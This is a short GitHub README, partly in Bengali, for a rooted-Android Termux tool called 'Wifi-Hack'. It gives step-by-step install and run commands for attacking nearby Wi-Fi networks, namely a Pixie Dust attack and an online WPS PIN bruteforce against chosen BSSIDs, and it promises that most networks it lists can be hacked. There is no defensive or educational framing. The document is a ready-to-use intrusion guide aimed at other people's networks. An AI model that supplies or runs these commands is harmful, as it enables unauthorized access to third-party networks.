## Wifi_Hack
### Hack WIfi Using Termux! (Requires Root)

<p align="center"><img src="[https://i.ibb.co/K74g0SC/hulu.jpg]"></p>

### Installation :

```bash
$ pkg update && pkg upgrade
$ pkg install git python
$ apt update && apt upgrade
$ pkg install -y root-repo
$ pkg install -y git tsu python 
$ wpa-supplicant pixiewps iw
$ git clone https://github.com/tanvirhasan999/Wifi-Hack
$ cd Wifi-Hack
$ chmod +x fück-wifi.py
এরপর Wifi অফ করে
$ sudo python fück-wifi.py -i wlan0 -K

পরের বার Tool অপেন করতে 
$ sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K

আপনার Range এর ভেতর এর সব Wifi Show করবে।
এগুলার ভেতর Green এর গুলা 99% হ্যাক হবে। আর White এর গুলোও হতে পারে চেষ্টা করে দেখবেন।আর যেগুলো Red গুলো হ্যাক হবেনা।
```

#### Example : `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K`

#### Note: 
**First turn off your Wifi.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python Wifi-Hack/fück-wifi.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
